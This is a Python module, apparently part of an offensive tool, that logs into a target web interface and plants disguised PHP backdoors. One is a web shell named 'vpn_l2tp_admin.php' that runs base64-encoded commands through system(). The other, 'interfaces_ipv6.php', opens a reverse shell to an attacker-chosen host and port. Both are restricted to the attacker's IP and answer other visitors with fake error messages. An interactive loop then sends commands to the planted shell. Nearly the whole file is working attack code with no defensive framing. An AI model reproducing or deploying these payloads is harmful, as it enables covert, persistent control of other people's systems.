import utils
import base64


web = """echo '<?php $up = HEYBEAR; $user = ip2long($_SERVER["REMOTE_ADDR"]); if($up == $user){ if(isset($_REQUEST["c"])){ echo "<pre>"; $c = ($_REQUEST["c"]); $cmd = base64_decode($c); system($cmd); echo "</pre>"; die; }}else{echo "Error: No GraphQL instance found.";};?>' > vpn_l2tp_admin.php"""

rev = """echo '<?php $up = HEYBEAR; $user = ip2long($_SERVER["REMOTE_ADDR"]); if($up == $user){ if(isset($_REQUEST["host"])){ $h = $_REQUEST["host"]; $decoded = base64_decode($h); $array = explode(" ",$decoded); $i = $array[0]; $p = $array[1]; $sock=fsockopen($i,$p);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); }}else{echo "Error: No IPv6 found";}?>' > interfaces_ipv6.php"""

def amateurRev(details):
    rev_mod = rev.replace("HEYBEAR", details.iplong)
    utils.simpleGET(details, "/", "", 0)
    utils.loginPOST(details)

    try:
        utils.cmdGET(details, rev_mod)
        print("Upload Complete!")
    except:
        print("Upload Failed!")

def amateurWeb(details):
    web_mod = web.replace("HEYBEAR", details.iplong)
    print(web_mod)
    utils.simpleGET(details, "/", "", 0)
    utils.loginPOST(details)

    try:
        utils.cmdGET(details, web_mod)
        print("Upload Complete!")
    except:
        print("Upload Failed")

def amateurAccess(details):
    cmd = ""

    while(cmd != "fin"):
        cmd = input("$: ").encode("ascii")
        cmd_encoded = base64.b64encode(cmd).decode("ascii")
        utils.simpleGET(details, "/vpn_l2tp_admin.php?c=",cmd_encoded, 1)
